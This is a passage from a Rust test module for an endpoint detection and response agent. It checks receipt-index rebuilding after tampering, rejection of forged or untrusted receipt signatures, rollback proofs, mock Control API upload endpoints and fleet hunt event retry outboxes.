                ttl_secs: Some(60),
            })
            .await
            .unwrap_or_else(|err| panic!("failed to submit raw artifact approval: {err}"));
        state
            .approval_queue
            .resolve(&request.id, ApprovalResolution::AllowOnce)
            .await
            .unwrap_or_else(|err| panic!("failed to resolve raw artifact approval: {err}"));
        request.id
    }

    fn test_settings_path() -> PathBuf {
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        std::env::temp_dir().join(format!(
            "clawdstrike-agent-api-test-settings-{}-{counter}.json",
            std::process::id()
        ))
    }

    fn test_receipt_path() -> PathBuf {
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        std::env::temp_dir().join(format!(
            "clawdstrike-agent-api-test-receipts-{}-{counter}.jsonl",
            std::process::id()
        ))
    }

    async fn assert_response_rollback_proof(
        app: Router,
        execution_id: &str,
        payload: &serde_json::Value,
        target_path: &std::path::Path,
        context: &str,
    ) {
        let target = target_path.display().to_string();
        assert_response_rollback_proof_target(app, execution_id, payload, &target, context).await;
    }

    async fn assert_response_rollback_proof_target(
        app: Router,
        execution_id: &str,
        payload: &serde_json::Value,
        expected_target: &str,
        context: &str,
    ) {
        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build {context} proof request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("{context} proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read {context} proof response: {e}"));
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected {context} proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let proof_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode {context} proof response: {e}"));
        assert_eq!(
            proof_payload["execution"]["execution"]["executionId"],
            payload["execution"]["executionId"]
        );
        assert_eq!(
            proof_payload["execution"]["execution"]["effects"][0]["target"],
            expected_target
        );
        assert_eq!(
            proof_payload["requestReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_request"
        );
        assert_eq!(
            proof_payload["executionReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_execution"
        );
        let transition_receipts = proof_payload["transitionReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing {context} proof transition receipts"));
        assert_eq!(transition_receipts.len(), 1);
        assert_eq!(
            transition_receipts[0]["receipt"]["metadata"]["endpointDecision"]["decision"]["title"],
            "Endpoint response action rolled back"
        );
        let rollback_receipts = proof_payload["rollbackReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing {context} proof rollback receipts"));
        assert_eq!(rollback_receipts.len(), 1);
        assert_eq!(
            rollback_receipts[0]["receipt"]["metadata"]["endpointDecision"]["receiptFamily"],
            "response_rollback"
        );
        assert!(proof_payload["acknowledgementReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing {context} proof acknowledgement receipts"))
            .is_empty());
    }

    #[test]
    fn endpoint_receipt_index_rebuilds_on_family_metadata_mismatch() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[91u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut receipt =
            EndpointDecisionReceipt::for_sensor_state(EndpointSensorStateReceiptInput {
                local_sequence: 1,
                endpoint_id: "endpoint-receipt-index-1",
                signer_identity: "test-edr-signer",
                policy: EndpointPolicySnapshot {
                    policy_version: "receipt-index-test".to_string(),
                    policy_hash: sha256(b"receipt-index-test-policy").to_hex_prefixed(),
                    policy_epoch: 1,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                reason: "receipt index metadata validation",
            });
        receipt.signer.signer_public_key = Some(signer_public_key.clone());
        let signed = receipt
            .sign_with(&keypair)
            .unwrap_or_else(|e| panic!("failed to sign receipt index test receipt: {e}"));
        let ledger = EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-signer".to_string(),
            signer_public_key,
        };
        ledger
            .append(std::slice::from_ref(&signed))
            .unwrap_or_else(|e| panic!("failed to append receipt index test receipt: {e}"));

        let receipt_index_path = endpoint_receipt_index_path(&receipt_path);
        let mut records = read_endpoint_receipt_index(&receipt_index_path)
            .unwrap_or_else(|e| panic!("failed to read receipt index: {e}"));
        assert_eq!(records.len(), 1);
        assert_eq!(records[0].family.as_deref(), Some("sensor_state"));
        records[0].family = Some("response_execution".to_string());
        let mut tampered_index = String::new();
        for record in &records {
            tampered_index.push_str(
                &serde_json::to_string(record)
                    .unwrap_or_else(|e| panic!("failed to encode tampered receipt index: {e}")),
            );
            tampered_index.push('\n');
        }
        std::fs::write(&receipt_index_path, tampered_index)
            .unwrap_or_else(|e| panic!("failed to write tampered receipt index: {e}"));

        let receipts = read_recent_indexed_endpoint_receipts(
            &receipt_path,
            10,
            EdrReceiptFilter {
                family: Some("response_execution"),
                ..EdrReceiptFilter::default()
            },
        )
        .unwrap_or_else(|e| panic!("failed to read indexed receipts: {e}"))
        .unwrap_or_else(|| panic!("missing indexed receipt lookup result"));

        assert!(receipts.is_empty());
        let rebuilt_records = read_endpoint_receipt_index(&receipt_index_path)
            .unwrap_or_else(|e| panic!("failed to read rebuilt receipt index: {e}"));
        assert_eq!(rebuilt_records.len(), 1);
        assert_eq!(rebuilt_records[0].family.as_deref(), Some("sensor_state"));

        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(receipt_index_path);
    }

    #[test]
    fn endpoint_receipt_index_rebuilds_before_filtering_stale_false_negative() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[97u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut receipt =
            EndpointDecisionReceipt::for_sensor_state(EndpointSensorStateReceiptInput {
                local_sequence: 1,
                endpoint_id: "endpoint-receipt-index-false-negative",
                signer_identity: "test-edr-signer",
                policy: EndpointPolicySnapshot {
                    policy_version: "receipt-index-false-negative-test".to_string(),
                    policy_hash: sha256(b"receipt-index-false-negative-policy").to_hex_prefixed(),
                    policy_epoch: 1,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                reason: "receipt index false-negative validation",
            });
        receipt.signer.signer_public_key = Some(signer_public_key.clone());
        let signed = receipt.sign_with(&keypair).unwrap_or_else(|e| {
            panic!("failed to sign receipt index false-negative test receipt: {e}")
        });
        let ledger = EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-signer".to_string(),
            signer_public_key,
        };
        ledger
            .append(std::slice::from_ref(&signed))
            .unwrap_or_else(|e| {
                panic!("failed to append receipt index false-negative test receipt: {e}")
            });

        let receipt_index_path = endpoint_receipt_index_path(&receipt_path);
        let mut records = read_endpoint_receipt_index(&receipt_index_path)
            .unwrap_or_else(|e| panic!("failed to read receipt index: {e}"));
        assert_eq!(records[0].family.as_deref(), Some("sensor_state"));
        records[0].family = Some("response_execution".to_string());
        let tampered_index = records
            .iter()
            .map(|record| {
                serde_json::to_string(record)
                    .unwrap_or_else(|e| panic!("failed to encode tampered receipt index: {e}"))
            })
            .collect::<Vec<_>>()
            .join("\n")
            + "\n";
        std::fs::write(&receipt_index_path, tampered_index)
            .unwrap_or_else(|e| panic!("failed to write tampered receipt index: {e}"));

        let receipts = read_recent_indexed_endpoint_receipts(
            &receipt_path,
            10,
            EdrReceiptFilter {
                family: Some("sensor_state"),
                ..EdrReceiptFilter::default()
            },
        )
        .unwrap_or_else(|e| panic!("failed to read indexed receipts: {e}"))
        .unwrap_or_else(|| panic!("missing indexed receipt lookup result"));

        assert_eq!(receipts.len(), 1);
        assert_eq!(receipt_family(&receipts[0]), Some("sensor_state"));
        let rebuilt_records = read_endpoint_receipt_index(&receipt_index_path)
            .unwrap_or_else(|e| panic!("failed to read rebuilt receipt index: {e}"));
        assert_eq!(rebuilt_records.len(), 1);
        assert_eq!(rebuilt_records[0].family.as_deref(), Some("sensor_state"));

        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(receipt_index_path);
    }

    #[test]
    fn endpoint_receipt_index_rebuilds_on_unknown_sidecar_field() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[95u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut receipt =
            EndpointDecisionReceipt::for_sensor_state(EndpointSensorStateReceiptInput {
                local_sequence: 1,
                endpoint_id: "endpoint-receipt-index-unknown-field-1",
                signer_identity: "test-edr-signer",
                policy: EndpointPolicySnapshot {
                    policy_version: "receipt-index-unknown-field-test".to_string(),
                    policy_hash: sha256(b"receipt-index-unknown-field-test-policy")
                        .to_hex_prefixed(),
                    policy_epoch: 1,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                reason: "receipt index unknown field validation",
            });
        receipt.signer.signer_public_key = Some(signer_public_key.clone());
        let signed = receipt
            .sign_with(&keypair)
            .unwrap_or_else(|e| panic!("failed to sign receipt index unknown-field receipt: {e}"));
        let expected_receipt_id = signed.receipt.receipt_id.clone();
        let ledger = EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-signer".to_string(),
            signer_public_key,
        };
        ledger
            .append(std::slice::from_ref(&signed))
            .unwrap_or_else(|e| {
                panic!("failed to append receipt index unknown-field receipt: {e}")
            });

        let receipt_index_path = endpoint_receipt_index_path(&receipt_path);
        let records = read_endpoint_receipt_index(&receipt_index_path)
            .unwrap_or_else(|e| panic!("failed to read receipt index: {e}"));
        assert_eq!(records.len(), 1);
        let mut unknown_index_record = serde_json::to_value(&records[0])
            .unwrap_or_else(|e| panic!("failed to encode receipt index record: {e}"));
        unknown_index_record["shadowReceiptFamily"] =
            serde_json::Value::String("must not be ignored".to_string());
        write_jsonl_value(&receipt_index_path, &unknown_index_record);
        assert_anyhow_error_mentions_unknown_field(
            read_endpoint_receipt_index(&receipt_index_path).unwrap_err(),
            "shadowReceiptFamily",
        );

        let receipts = read_recent_indexed_endpoint_receipts(
            &receipt_path,
            10,
            EdrReceiptFilter {
                family: Some("sensor_state"),
                ..EdrReceiptFilter::default()
            },
        )
        .unwrap_or_else(|e| panic!("failed to read indexed receipts after corrupt index: {e}"))
        .unwrap_or_else(|| panic!("missing indexed receipt lookup result"));

        assert_eq!(receipts.len(), 1);
        assert_eq!(
            receipts[0].receipt.receipt_id.as_deref(),
            expected_receipt_id.as_deref()
        );
        let rebuilt_records = read_endpoint_receipt_index(&receipt_index_path)
            .unwrap_or_else(|e| panic!("failed to read rebuilt receipt index: {e}"));
        assert_eq!(rebuilt_records.len(), 1);
        assert_eq!(rebuilt_records[0].family.as_deref(), Some("sensor_state"));
        let rebuilt_index = std::fs::read_to_string(&receipt_index_path)
            .unwrap_or_else(|e| panic!("failed to read rebuilt receipt index contents: {e}"));
        assert!(!rebuilt_index.contains("shadowReceiptFamily"));

        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(receipt_index_path);
    }

    #[test]
    fn latest_required_receipt_rejects_invalid_signature() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[92u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let (execution, graph) = test_collect_evidence_execution(
            "proc-invalid-proof-receipt-1",
            "invalid-proof-receipt.example.invalid",
            600,
            "collect proof receipt signature validation evidence",
        );
        let plan = EndpointResponsePlan {
            action_id: execution.action_id.clone(),
            action: execution.action.clone(),
            dry_run: execution.dry_run,
            root_node_id: execution.root_node_id.clone(),
            graph_slice_id: execution.graph_slice_id.clone(),
            ttl_seconds: execution.ttl_seconds,
            rollback_ref: execution.rollback_ref.clone(),
            reason: execution.reason.clone(),
            created_at: execution.started_at,
            expires_at: execution.expires_at(),
            node_count: execution.evidence_bundle.node_count,
            edge_count: execution.evidence_bundle.edge_count,
        };
        let mut receipt =
            EndpointDecisionReceipt::for_response_request(EndpointResponseReceiptInput {
                local_sequence: 1,
                endpoint_id: "endpoint-invalid-proof-receipt-1",
                signer_identity: "test-edr-signer",
                actor: EndpointDecisionActor {
                    user_id: Some("operator:test".to_string()),
                    ..EndpointDecisionActor::default()
                },
                policy: EndpointPolicySnapshot {
                    policy_version: "proof-receipt-signature-test".to_string(),
                    policy_hash: sha256(b"proof-receipt-signature-test-policy").to_hex_prefixed(),
                    policy_epoch: 1,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                plan: &plan,
                graph: &graph,
            });
        receipt.signer.signer_public_key = Some(signer_public_key.clone());
        let mut signed = receipt
            .sign_with(&keypair)
            .unwrap_or_else(|e| panic!("failed to sign proof receipt test receipt: {e}"));
        signed.receipt.timestamp = "2099-01-01T00:00:00Z".to_string();
        let ledger = EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-signer".to_string(),
            signer_public_key,
        };
        ledger
            .append(std::slice::from_ref(&signed))
            .unwrap_or_else(|e| panic!("failed to append invalid proof receipt: {e}"));

        let result = latest_required_receipt(
            &ledger,
            "response_request",
            execution.action_id.as_str(),
            "response request receipt",
        );

        match result {
            Ok(_) => panic!("invalid receipt signature was accepted"),
            Err((status, message)) => {
                assert_eq!(status, StatusCode::CONFLICT);
                assert!(message.contains("signature"));
            }
        }

        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

    #[test]
    fn latest_required_receipt_rejects_untrusted_signer() {
        let receipt_path = test_receipt_path();
        let trusted_keypair = Keypair::from_seed(&[93u8; 32]);
        let trusted_signer_public_key = trusted_keypair.public_key().to_hex();
        let untrusted_keypair = Keypair::from_seed(&[94u8; 32]);
        let untrusted_signer_public_key = untrusted_keypair.public_key().to_hex();
        let (execution, graph) = test_collect_evidence_execution(
            "proc-untrusted-proof-receipt-1",
            "untrusted-proof-receipt.example.invalid",
            600,
            "collect proof receipt signer trust evidence",
        );
        let plan = EndpointResponsePlan {
            action_id: execution.action_id.clone(),
            action: execution.action.clone(),
            dry_run: execution.dry_run,
            root_node_id: execution.root_node_id.clone(),
            graph_slice_id: execution.graph_slice_id.clone(),
            ttl_seconds: execution.ttl_seconds,
            rollback_ref: execution.rollback_ref.clone(),
            reason: execution.reason.clone(),
            created_at: execution.started_at,
            expires_at: execution.expires_at(),
            node_count: execution.evidence_bundle.node_count,
            edge_count: execution.evidence_bundle.edge_count,
        };
        let mut receipt =
            EndpointDecisionReceipt::for_response_request(EndpointResponseReceiptInput {
                local_sequence: 1,
                endpoint_id: "endpoint-untrusted-proof-receipt-1",
                signer_identity: "test-edr-signer",
                actor: EndpointDecisionActor {
                    user_id: Some("operator:test".to_string()),
                    ..EndpointDecisionActor::default()
                },
                policy: EndpointPolicySnapshot {
                    policy_version: "proof-receipt-signer-test".to_string(),
                    policy_hash: sha256(b"proof-receipt-signer-test-policy").to_hex_prefixed(),
                    policy_epoch: 1,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                plan: &plan,
                graph: &graph,
            });
        receipt.signer.signer_public_key = Some(untrusted_signer_public_key);
        let signed = receipt
            .sign_with(&untrusted_keypair)
            .unwrap_or_else(|e| panic!("failed to sign untrusted proof receipt: {e}"));
        let ledger = EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair: trusted_keypair,
            signer_identity: "test-edr-signer".to_string(),
            signer_public_key: trusted_signer_public_key,
        };
        ledger
            .append(std::slice::from_ref(&signed))
            .unwrap_or_else(|e| panic!("failed to append untrusted proof receipt: {e}"));

        let result = latest_required_receipt(
            &ledger,
            "response_request",
            execution.action_id.as_str(),
            "response request receipt",
        );

        match result {
            Ok(_) => panic!("untrusted receipt signer was accepted"),
            Err((status, message)) => {
                assert_eq!(status, StatusCode::CONFLICT);
                assert!(message.contains("signer"));
            }
        }

        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

    fn test_flight_recorder_path() -> PathBuf {
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        std::env::temp_dir().join(format!(
            "clawdstrike-agent-api-test-flight-recorder-{}-{counter}.jsonl",
            std::process::id()
        ))
    }

    fn test_honey_registry_path() -> PathBuf {
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        std::env::temp_dir().join(format!(
            "clawdstrike-agent-api-test-honey-{}-{counter}.jsonl",
            std::process::id()
        ))
    }

    fn test_evidence_bundle_dir() -> PathBuf {
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        std::env::temp_dir().join(format!(
            "clawdstrike-agent-api-test-bundles-{}-{counter}",
            std::process::id()
        ))
    }

    fn test_stored_graph_slice_bundle(
        process_guid: &str,
        host: &str,
        reason: &str,
        age_seconds: i64,
    ) -> (EndpointEvidenceBundleReference, CausalGraph) {
        let observation = EndpointObservation {
            observation_id: format!("bundle-maintenance-{process_guid}"),
            process: EndpointProcess {
                process_guid: Some(process_guid.to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::NetworkFlow {
                host: host.to_string(),
                port: 443,
                protocol: Some("tcp".to_string()),
                url: Some(format!("https://{host}/upload")),
            },
            ..EndpointObservation::default()
        };
        let root_node_id = observation.process.stable_node_id();
        let mut recorder = CausalGraphRecorder::new();
        recorder.record_observation(&observation);
        let graph = recorder.into_graph();
        let mut bundle =
            evidence_bundle_for_graph_slice(&root_node_id, "causal_subgraph", Some(reason), &graph)
                .unwrap_or_else(|err| panic!("failed to create test graph-slice bundle: {err}"));
        bundle.created_at = chrono::Utc::now() - chrono::Duration::seconds(age_seconds);
        (bundle, graph)
    }

    fn test_response_execution_path() -> PathBuf {
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        std::env::temp_dir().join(format!(
            "clawdstrike-agent-api-test-response-executions-{}-{counter}.jsonl",
            std::process::id()
        ))
    }

    fn test_response_acknowledgement_path() -> PathBuf {
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        std::env::temp_dir().join(format!(
            "clawdstrike-agent-api-test-response-acknowledgements-{}-{counter}.jsonl",
            std::process::id()
        ))
    }

    fn test_control_ack_postback_retry_path() -> PathBuf {
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        std::env::temp_dir().join(format!(
            "clawdstrike-agent-api-test-control-ack-postback-retries-{}-{counter}.json",
            std::process::id()
        ))
    }

    fn test_control_archive_upload_retry_path() -> PathBuf {
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        std::env::temp_dir().join(format!(
            "clawdstrike-agent-api-test-control-archive-upload-retries-{}-{counter}.json",
            std::process::id()
        ))
    }

    fn test_control_receipt_upload_retry_path() -> PathBuf {
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        std::env::temp_dir().join(format!(
            "clawdstrike-agent-api-test-control-receipt-upload-retries-{}-{counter}.json",
            std::process::id()
        ))
    }

    fn test_fleet_hunt_event_outbox_path() -> PathBuf {
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        std::env::temp_dir().join(format!(
            "clawdstrike-agent-api-test-fleet-hunt-event-outbox-{}-{counter}.json",
            std::process::id()
        ))
    }

    fn test_fleet_hunt_event_outbox_entry(
        outbox_id: &str,
        event_id: &str,
        raw_ref: &str,
        next_attempt_at: chrono::DateTime<chrono::Utc>,
    ) -> EndpointFleetHuntEventOutboxEntry {
        let now = chrono::Utc::now();
        EndpointFleetHuntEventOutboxEntry {
            outbox_id: outbox_id.to_string(),
            event_id: event_id.to_string(),
            raw_ref: raw_ref.to_string(),
            event: serde_json::json!({
                "eventId": event_id,
                "source": "receipt",
                "kind": "detection_fired",
                "tenantId": "4b83d8d0-7b6d-4a3b-8cc4-0aa83d1f3b41",
                "agentId": "endpoint-agent-archive-1",
                "evidence": {
                    "rawRef": raw_ref,
                    "schemaName": "clawdstrike.edr.evidence_bundle_archive.v1"
                },
                "target": {
                    "kind": "evidence_bundle",
                    "id": "bundle-outbox-test"
                },
                "attributes": {
                    "archiveHash": "0x0123456789abcdef",
                    "verification": {
                        "verified": true
                    }
                }
            }),
            attempt_count: 1,
            next_attempt_at,
            last_attempt_at: None,
            last_error_hash: None,
            created_at: now,
            updated_at: now,
        }
    }

    struct TestFleetHuntPublisher {
        agent_id: String,
        published: Mutex<Vec<serde_json::Value>>,
        failures_remaining: Mutex<usize>,
    }

    impl TestFleetHuntPublisher {
        fn new(agent_id: &str) -> Self {
            Self {
                agent_id: agent_id.to_string(),
                published: Mutex::new(Vec::new()),
                failures_remaining: Mutex::new(0),
            }
        }

        async fn published_events(&self) -> Vec<serde_json::Value> {
            self.published.lock().await.clone()
        }
    }

    impl FleetHuntEventPublisher for TestFleetHuntPublisher {
        fn agent_id(&self) -> &str {
            &self.agent_id
        }

        fn publish_hunt_event<'a>(
            &'a self,
            event_json: &'a [u8],
        ) -> FleetHuntEventPublishFuture<'a> {
            Box::pin(async move {
                let mut failures_remaining = self.failures_remaining.lock().await;
                if *failures_remaining > 0 {
                    *failures_remaining -= 1;
                    return Err(anyhow::anyhow!("injected fleet hunt event publish failure"));
                }
                drop(failures_remaining);

                let event = serde_json::from_slice(event_json)
                    .with_context(|| "decode published fleet hunt event")?;
                self.published.lock().await.push(event);
                Ok(())
            })
        }
    }

    #[derive(Clone, Default)]
    struct MockControlApiArchiveState {
        requests: Arc<Mutex<Vec<MockControlApiArchiveRequest>>>,
        failures_remaining: Arc<Mutex<usize>>,
    }

    #[derive(Clone, Debug)]
    struct MockControlApiArchiveRequest {
        api_key: Option<String>,
        body: serde_json::Value,
    }

    async fn mock_control_api_record_endpoint_archive(
        State(state): State<MockControlApiArchiveState>,
        headers: HeaderMap,
        Json(body): Json<serde_json::Value>,
    ) -> Response {
        state
            .requests
            .lock()
            .await
            .push(MockControlApiArchiveRequest {
                api_key: headers
                    .get("x-api-key")
                    .and_then(|value| value.to_str().ok())
                    .map(str::to_string),
                body: body.clone(),
            });
        let mut failures_remaining = state.failures_remaining.lock().await;
        if *failures_remaining > 0 {
            *failures_remaining -= 1;
            return (
                StatusCode::SERVICE_UNAVAILABLE,
                Json(serde_json::json!({ "retained": false })),
            )
                .into_response();
        }
        Json(serde_json::json!({
            "archiveId": body["archiveId"].clone(),
            "archiveHash": body["archiveHash"].clone(),
            "rawRef": body["rawRef"].clone(),
            "bundleId": body["bundleId"].clone(),
            "retained": true
        }))
        .into_response()
    }

    async fn spawn_mock_control_api_archive() -> (
        String,
        MockControlApiArchiveState,
        tokio::task::JoinHandle<()>,
    ) {
        let state = MockControlApiArchiveState::default();
        let app = Router::new()
            .route(
                "/api/v1/hunt/evidence-bundle-archives",
                post(mock_control_api_record_endpoint_archive),
            )
            .with_state(state.clone());
        let listener = TcpListener::bind("127.0.0.1:0")
            .await
            .unwrap_or_else(|e| panic!("failed to bind mock Control API archive endpoint: {e}"));
        let port = listener
            .local_addr()
            .unwrap_or_else(|e| {
                panic!("failed to read mock Control API archive endpoint port: {e}")
            })
            .port();
        let handle = tokio::spawn(async move {
            axum::serve(listener, app)
                .await
                .unwrap_or_else(|e| panic!("mock Control API archive endpoint failed: {e}"));
        });
        (format!("http://127.0.0.1:{port}"), state, handle)
    }

    #[derive(Clone, Default)]
    struct MockControlApiReceiptState {
        requests: Arc<Mutex<Vec<MockControlApiReceiptRequest>>>,
        failures_remaining: Arc<Mutex<usize>>,
    }

    #[derive(Clone, Debug)]
    struct MockControlApiReceiptRequest {
        api_key: Option<String>,
        body: serde_json::Value,
    }

    async fn mock_control_api_store_receipts(
        State(state): State<MockControlApiReceiptState>,
        headers: HeaderMap,
        Json(body): Json<serde_json::Value>,
    ) -> Response {
        state
            .requests
            .lock()
            .await
            .push(MockControlApiReceiptRequest {
                api_key: headers
                    .get("x-api-key")
                    .and_then(|value| value.to_str().ok())
                    .map(str::to_string),
                body: body.clone(),
            });
        let mut failures_remaining = state.failures_remaining.lock().await;
        if *failures_remaining > 0 {
            *failures_remaining -= 1;
            return (
                StatusCode::SERVICE_UNAVAILABLE,
                Json(serde_json::json!({ "stored": [], "count": 0 })),
            )
                .into_response();
        }
        drop(failures_remaining);
        let receipts = body
            .get("receipts")
            .and_then(serde_json::Value::as_array)
            .cloned()
            .unwrap_or_default();
        let stored: Vec<_> = receipts
            .iter()
            .enumerate()
            .map(|(index, receipt)| {
                serde_json::json!({
                    "id": format!("00000000-0000-4000-8000-{index:012}"),
                    "timestamp": receipt["timestamp"].clone(),
                    "verdict": receipt["verdict"].clone(),
                    "guard": receipt["guard"].clone(),
                    "policy_name": receipt["policy_name"].clone(),
                    "signature": receipt["signature"].clone(),
                    "public_key": receipt["public_key"].clone(),
                })
            })
            .collect();
        Json(serde_json::json!({
            "stored": stored,
            "count": receipts.len()
        }))
        .into_response()
    }

    async fn spawn_mock_control_api_receipts() -> (
        String,
        MockControlApiReceiptState,
        tokio::task::JoinHandle<()>,
    ) {
        let state = MockControlApiReceiptState::default();
        let app = Router::new()
            .route(
                "/api/v1/receipts/batch",
                post(mock_control_api_store_receipts),
            )
            .with_state(state.clone());
        let listener = TcpListener::bind("127.0.0.1:0")
            .await
            .unwrap_or_else(|e| panic!("failed to bind mock Control API receipt endpoint: {e}"));
        let port = listener
            .local_addr()
            .unwrap_or_else(|e| {
                panic!("failed to read mock Control API receipt endpoint port: {e}")
            })
            .port();
        let handle = tokio::spawn(async move {
            axum::serve(listener, app)
                .await
                .unwrap_or_else(|e| panic!("mock Control API receipt endpoint failed: {e}"));
        });
        (format!("http://127.0.0.1:{port}"), state, handle)
    }

    #[test]
    fn endpoint_fleet_hunt_event_outbox_tracks_retry_state() {
        let path = test_fleet_hunt_event_outbox_path();
        let now = chrono::Utc::now();
        let due = test_fleet_hunt_event_outbox_entry(
            "0xfleet-due",
            "event-due",
            "endpoint-evidence-bundle-archive:due:0xaaa",
            now - chrono::Duration::seconds(1),
        );
        let future = test_fleet_hunt_event_outbox_entry(
            "0xfleet-future",
            "event-future",
            "endpoint-evidence-bundle-archive:future:0xbbb",
            now + chrono::Duration::seconds(300),
        );
        let mut outbox = EndpointFleetHuntEventOutbox::open(&path)
            .unwrap_or_else(|err| panic!("failed to open fleet hunt event outbox: {err}"));

        outbox
            .append(due)
            .unwrap_or_else(|err| panic!("failed to append due outbox event: {err}"));
        outbox
            .append(future)
            .unwrap_or_else(|err| panic!("failed to append future outbox event: {err}"));

        assert_eq!(outbox.path(), Some(path.as_path()));
        assert_eq!(outbox.pending_count(), 2);
        assert_eq!(outbox.due(now, 10, false).len(), 1);
        assert_eq!(outbox.due(now, 10, true).len(), 2);

        let error_hash = sha256(b"nats disconnected").to_hex_prefixed();
        let updated = outbox
            .mark_failed("0xfleet-due", now, Some(error_hash.clone()))
            .unwrap_or_else(|err| panic!("failed to mark outbox event failed: {err}"))
            .unwrap_or_else(|| panic!("missing failed outbox event"));
        assert_eq!(updated.attempt_count, 2);
        assert_eq!(updated.last_attempt_at, Some(now));
        assert_eq!(
            updated.last_error_hash.as_deref(),
            Some(error_hash.as_str())
        );
        assert!(updated.next_attempt_at > now);

        let delivered = outbox
            .mark_delivered("0xfleet-future")
            .unwrap_or_else(|err| panic!("failed to mark outbox event delivered: {err}"))
            .unwrap_or_else(|| panic!("missing delivered outbox event"));
        assert_eq!(delivered.event_id, "event-future");
        assert_eq!(outbox.pending_count(), 1);

        let persisted = read_fleet_hunt_event_outbox(&path)
            .unwrap_or_else(|err| panic!("failed to read persisted fleet hunt outbox: {err}"));
        assert_eq!(persisted.len(), 1);
        assert_eq!(persisted[0].outbox_id, "0xfleet-due");
        assert_eq!(persisted[0].attempt_count, 2);
        assert_eq!(
            persisted[0].last_error_hash.as_deref(),
            Some(error_hash.as_str())
        );

        let mut shadow_outbox_entry = serde_json::to_value(&persisted[0])
            .unwrap_or_else(|err| panic!("failed to encode fleet hunt outbox entry: {err}"));
        shadow_outbox_entry
            .as_object_mut()
            .unwrap_or_else(|| panic!("fleet hunt outbox entry was not a JSON object"))
            .insert(
                "shadowOutboxId".to_string(),
                serde_json::json!("0xshadow-outbox"),
            );
        assert_unknown_field_rejected::<EndpointFleetHuntEventOutboxEntry>(
            shadow_outbox_entry.clone(),
            "shadowOutboxId",
        );
        let shadow_outbox_path = test_fleet_hunt_event_outbox_path();
        write_jsonl_value(
            &shadow_outbox_path,
            &serde_json::json!([shadow_outbox_entry]),
        );
        let err = match read_fleet_hunt_event_outbox(&shadow_outbox_path) {
            Ok(_) => panic!("expected shadow outbox entry rejection"),
            Err(err) => err,
        };
        assert_anyhow_error_mentions_unknown_field(err, "shadowOutboxId");
        let _ = std::fs::remove_file(shadow_outbox_path);
    }

    #[tokio::test]
    async fn fleet_hunt_event_retry_requires_nats_without_dropping_queue() {
        let mut state = test_state();
        let outbox_path = test_fleet_hunt_event_outbox_path();
        state.edr_fleet_hunt_event_outbox = Arc::new(Mutex::new(
            EndpointFleetHuntEventOutbox::open(&outbox_path)
                .unwrap_or_else(|err| panic!("failed to open fleet hunt event outbox: {err}")),
        ));
        {
            let mut outbox = state.edr_fleet_hunt_event_outbox.lock().await;
            outbox
                .append(test_fleet_hunt_event_outbox_entry(
                    "0xfleet-retry-no-nats",
                    "event-retry-no-nats",
                    "endpoint-evidence-bundle-archive:no-nats:0xccc",
